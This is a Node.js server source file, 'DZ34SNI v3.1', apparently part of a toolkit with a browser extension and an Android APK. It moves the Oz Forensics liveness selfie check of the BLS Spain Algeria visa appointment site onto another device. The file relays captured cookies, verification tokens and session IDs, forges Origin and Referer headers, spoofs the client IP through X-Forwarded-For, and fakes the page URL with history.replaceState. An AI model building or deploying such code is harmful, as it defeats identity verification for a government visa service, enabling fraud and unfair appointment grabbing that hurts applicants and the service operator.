/**
 * DZ34SNI Server v3.1 — WITH OZ PROXY
 * 
 * The APK's WebView intercepts all ozforensics.com requests via shouldInterceptRequest
 * and routes them to /oz-proxy/:phone/* on this server.
 * This server then proxies to ozforensics.com with X-Forwarded-For = agent's IP.
 * 
 * Flow:
 * 1. Extension captures userId + transactionId + agent IP
 * 2. Extension POSTs task to /task/:phone
 * 3. APK polls /task/:phone → gets task + agent IP
 * 4. APK navigates to /oz-page → HTML loads OZ SDK normally
 * 5. WebView's shouldInterceptRequest catches ozforensics.com requests
 * 6. WebView sends them to /oz-proxy/:phone/... on this server
 * 7. Server proxies to ozforensics.com with X-Forwarded-For = agent IP
 * 8. OZ sees the agent's IP ✅
 * 9. APK POSTs result to /result/:phone
 * 10. Extension polls /result/:phone → injects session_id
 */

const express = require('express');
const cors = require('cors');
const https = require('https');
const { URL } = require('url');
const app = express();
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════
app.use(cors());

// For proxy: accept raw binary bodies
app.use('/oz-proxy', (req, res, next) => {
    if (req.method === 'GET' || req.method === 'HEAD' || req.method === 'OPTIONS') {
        return next();
    }
    const chunks = [];
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => {
        req.rawBody = Buffer.concat(chunks);
        next();
    });
});

app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true }));

// Request logging
app.use((req, res, next) => {
    const ts = new Date().toISOString().substring(11, 19);
    const path = req.path.length > 80 ? req.path.substring(0, 80) + '...' : req.path;
    console.log(`[${ts}] ${req.method} ${path}`);
    next();
});

// ═══════════════════════════════════════════
// IN-MEMORY STORAGE
// ═══════════════════════════════════════════
const tasks = {};
const results = {};
const ipMap = {};

setInterval(() => {
    const now = Date.now();
    const MAX_AGE = 30 * 60 * 1000;
    for (const phone in tasks) {
        if (now - (tasks[phone].timestamp || 0) > MAX_AGE) {
            delete tasks[phone]; delete ipMap[phone];
        }
    }
    for (const phone in results) {
        if (now - (results[phone].timestamp || 0) > MAX_AGE) {
            delete results[phone];
        }
    }
}, 5 * 60 * 1000);

// ═══════════════════════════════════════════
// TASK ROUTES
// ═══════════════════════════════════════════
app.post('/task/:phone', (req, res) => {
    const phone = req.params.phone;
    const body = req.body || {};
    if (!body.userId || !body.transactionId) {
        return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });
    }
    tasks[phone] = {
        userId: body.userId, transactionId: body.transactionId,
        realIp: body.realIp || '', cookies: body.cookies || '',
        userAgent: body.userAgent || '', pageUrl: body.pageUrl || '',
        verificationToken: body.verificationToken || '',
        timestamp: body.timestamp || Date.now()
    };
    if (body.realIp) ipMap[phone] = body.realIp;
    console.log(`[TASK] 📥 ${phone}: userId=${body.userId.substring(0, 20)}... realIp=${body.realIp || 'none'}`);
    res.json({ ok: true });
});

app.get('/task/:phone', (req, res) => {
    const task = tasks[req.params.phone];
    res.json(task ? { ok: true, task } : { ok: false, task: null });
});

// ═══════════════════════════════════════════
// RESULT ROUTES  
// ═══════════════════════════════════════════
app.post('/result/:phone', (req, res) => {
    const phone = req.params.phone;
    const body = req.body || {};
    if (!body.event_session_id) {
        return res.status(400).json({ ok: false, error: 'Missing event_session_id' });
    }
    results[phone] = {
        event_session_id: body.event_session_id,
        status: body.status || 'completed',
        realIp: body.realIp || ipMap[phone] || '',
        timestamp: body.timestamp || Date.now()
    };
    delete tasks[phone];
    console.log(`[RESULT] ✅ ${phone}: session=${body.event_session_id.substring(0, 20)}...`);
    res.json({ ok: true });
});

app.get('/result/:phone', (req, res) => {
    const result = results[req.params.phone];
    res.json(result ? { ok: true, result } : { ok: false, result: null });
});

app.delete('/clear/:phone', (req, res) => {
    const phone = req.params.phone;
    delete tasks[phone]; delete results[phone]; delete ipMap[phone];
    res.json({ ok: true });
});

// ═══════════════════════════════════════════
// OZ PROXY — Proxies requests to ozforensics.com
// ═══════════════════════════════════════════

// CORS preflight
app.options('/oz-proxy/:phone/*', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    res.setHeader('Access-Control-Max-Age', '86400');
    res.status(204).end();
});

app.all('/oz-proxy/:phone/*', (req, res) => {
    const phone = req.params.phone;
    const agentIp = ipMap[phone] || '';
    const afterPrefix = req.params[0];

    if (!afterPrefix) {
        return res.status(400).json({ ok: false, error: 'Missing target URL' });
    }

    const targetUrl = 'https://' + afterPrefix + (req._parsedUrl.search || '');

    let parsedUrl;
    try { parsedUrl = new URL(targetUrl); } catch(e) {
        return res.status(400).json({ ok: false, error: 'Invalid URL' });
    }

    if (!parsedUrl.hostname.includes('ozforensics.com')) {
        return res.status(403).json({ ok: false, error: 'Only ozforensics.com allowed' });
    }

    console.log(`[OZ-PROXY] ${req.method} → ${parsedUrl.hostname}${parsedUrl.pathname.substring(0, 50)} (IP: ${agentIp || 'none'})`);

    // Build headers
    const proxyHeaders = {};
    const copyHeaders = ['content-type', 'accept', 'accept-language', 'content-length'];
    for (const h of copyHeaders) {
        if (req.headers[h]) proxyHeaders[h] = req.headers[h];
    }

    proxyHeaders['Host'] = parsedUrl.hostname;
    proxyHeaders['Origin'] = 'https://algeria.blsspainglobal.com';
    proxyHeaders['Referer'] = 'https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest';
    proxyHeaders['User-Agent'] = req.headers['user-agent'] || 'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0';

    if (agentIp) {
        proxyHeaders['X-Forwarded-For'] = agentIp;
        proxyHeaders['X-Real-IP'] = agentIp;
    }

    const options = {
        hostname: parsedUrl.hostname,
        port: 443,
        path: parsedUrl.pathname + parsedUrl.search,
        method: req.method,
        headers: proxyHeaders,
        timeout: 120000
    };

    const proxyReq = https.request(options, (proxyRes) => {
        // Set CORS
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', '*');

        // Copy response headers
        for (const [key, value] of Object.entries(proxyRes.headers)) {
            const lk = key.toLowerCase();
            if (lk !== 'transfer-encoding' && lk !== 'content-encoding' && 
                lk !== 'connection' && lk !== 'access-control-allow-origin') {
                res.setHeader(key, value);
            }
        }

        res.status(proxyRes.statusCode);
        proxyRes.pipe(res);
    });

    proxyReq.on('error', (err) => {
        console.error(`[OZ-PROXY] Error: ${err.message}`);
        res.status(502).json({ ok: false, error: 'Proxy error: ' + err.message });
    });

    proxyReq.on('timeout', () => {
        proxyReq.destroy();
        res.status(504).json({ ok: false, error: 'Proxy timeout' });
    });

    // Forward body for POST/PUT
    if (req.rawBody && req.rawBody.length > 0) {
        proxyReq.write(req.rawBody);
    }

    proxyReq.end();
});

// ═══════════════════════════════════════════
// OZ-PAGE — Loads the real OZ SDK directly
// WebView's shouldInterceptRequest will intercept the SDK requests
// ═══════════════════════════════════════════
app.get('/oz-page', (req, res) => {
    const { userId, transactionId, realIp, phone } = req.query;

    const escJs = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
    const uid = escJs(userId);
    const tid = escJs(transactionId);
    const ip = escJs(realIp);
    const ph = escJs(phone);

    const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    const host = req.headers['host'] || 'dz34sni-26.onrender.com';
    const serverBase = `${proto}://${host}`;

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>BLS Liveness Check</title>
<style>
body { margin: 0; background: #fff; font-family: 'Segoe UI', Arial, sans-serif; }
#st {
    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
    background: rgba(0,0,0,.85); color: #fff; padding: 12px 24px; border-radius: 10px;
    font-size: 14px; z-index: 99999; text-align: center; font-weight: 600;
    box-shadow: 0 4px 20px rgba(0,0,0,.3);
}
</style>
</head>
<body>
<div id="oz-container"></div>
<div id="st">Chargement SDK... (proxy WebView)</div>

<!-- URL bar spoof -->
<script>
try { history.replaceState({}, '', '/dza/appointment/LivenessRequest'); } catch(e) {}
</script>

<!-- Form for compatibility -->
<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
    <input type="hidden" name="event_session_id" id="event_session_id" value="">
    <input type="hidden" name="LivenessId" id="LivenessId" value="">
    <input type="hidden" name="__RequestVerificationToken" value="">
</form>

<!-- 
  Load OZ SDK DIRECTLY from ozforensics.com
  The Android WebView's shouldInterceptRequest will catch this request
  and route it through /oz-proxy/ on the server with agent's IP
-->
<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>

<!-- Launch liveness -->
<script>
window.addEventListener('load', function() {
    document.getElementById('st').textContent = 'Lancement...';
    setTimeout(function() {
        try {
            if (typeof OzLiveness === 'undefined') {
                document.getElementById('st').textContent = 'SDK non charge!';
                if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError('SDK not loaded');
                return;
            }
            document.getElementById('st').textContent = 'Demarrage selfie...';
            OzLiveness.open({
                lang: 'en',
                meta: { 'user_id': '${uid}', 'transaction_id': '${tid}' },
                overlay_options: false,
                action: ['video_selfie_blank'],
                result_mode: 'safe',
                on_complete: function(r) {
                    var sid = r && r.event_session_id ? String(r.event_session_id) : '';
                    if (sid) {
                        document.getElementById('st').textContent = 'Selfie OK! Envoi...';
                        try { document.getElementById('event_session_id').value = sid; } catch(e) {}
                        try { document.getElementById('LivenessId').value = sid; } catch(e) {}

                        // Send result to server
                        fetch('${serverBase}/result/' + encodeURIComponent('${ph}'), {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                event_session_id: sid,
                                status: 'completed',
                                realIp: '${ip}',
                                timestamp: Date.now()
                            })
                        }).then(function() {
                            document.getElementById('st').textContent = 'Selfie envoye!';
                            if (window.__dz34sni_bridge) {
                                window.__dz34sni_bridge.onResult(sid);
                                setTimeout(function() { window.__dz34sni_bridge.onGoHome(); }, 3000);
                            }
                        }).catch(function(e) {
                            document.getElementById('st').textContent = 'Selfie OK mais erreur envoi';
                            if (window.__dz34sni_bridge) window.__dz34sni_bridge.onResult(sid);
                        });
                    } else {
                        document.getElementById('st').textContent = 'Pas de session ID';
                        if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError('No session ID');
                    }
                },
                on_error: function(e) {
                    var msg = e && e.message ? e.message : String(e);
                    document.getElementById('st').textContent = 'Erreur: ' + msg;
                    if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError(msg);
                }
            });
        } catch(x) {
            document.getElementById('st').textContent = 'Erreur: ' + x.message;
            if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError(x.message);
        }
    }, 3000);
});
</script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
});

// ═══════════════════════════════════════════
// HEALTH
// ═══════════════════════════════════════════
app.get('/', (req, res) => {
    res.json({
        service: 'DZ34SNI', version: '3.1-WEBVIEW-PROXY',
        activeTasks: Object.keys(tasks).length,
        activeResults: Object.keys(results).length,
        activeIpMaps: Object.keys(ipMap).length,
        uptime: Math.floor(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => res.json({ ok: true }));

app.get('/debug', (req, res) => {
    res.json({
        tasks: Object.keys(tasks).map(p => ({ phone: p, realIp: tasks[p].realIp || 'none' })),
        results: Object.keys(results).map(p => ({ phone: p })),
        ipMap: Object.keys(ipMap).map(p => ({ phone: p, agentIp: ipMap[p] }))
    });
});

app.listen(PORT, () => {
    console.log(`\n🐉 DZ34SNI Server v3.1 — WebView Proxy`);
    console.log(`   Port: ${PORT}`);
    console.log(`   Ready!\n`);
});
